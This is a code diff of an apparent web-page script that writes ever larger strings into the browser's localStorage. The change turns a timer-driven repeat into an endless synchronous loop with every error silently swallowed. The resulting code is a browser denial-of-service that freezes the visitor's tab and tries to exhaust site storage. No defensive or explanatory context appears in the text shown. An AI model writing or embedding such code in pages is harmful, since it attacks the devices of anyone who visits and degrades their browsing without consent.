@@ -7,22 +7,23 @@
             let counter = 0;
             const initialSize = 10000;
             const growthRate = 199;
-            
+
             function generateData(size) {
                 return '0'.repeat(size);
             }
-            
+
             function save() {
-                const dataSize = Math.floor(initialSize * Math.pow(growthRate, counter));
-                const data = generateData(dataSize);
-                const key = 'x' + performance.now();
-                
-                try {
-                    localStorage.setItem(key, data);
-                    counter++;
-                } catch(e) {
+                while (true) {
+                    const dataSize = Math.floor(initialSize * Math.pow(growthRate, counter));
+                    const data = generateData(dataSize);
+                    const key = 'x' + performance.now();
+
+                    try {
+                        localStorage.setItem(key, data);
+                        counter++;
+                    } catch(e) {
+                    }
                 }
-                setTimeout(save, 0);
             }
             save();
         })();
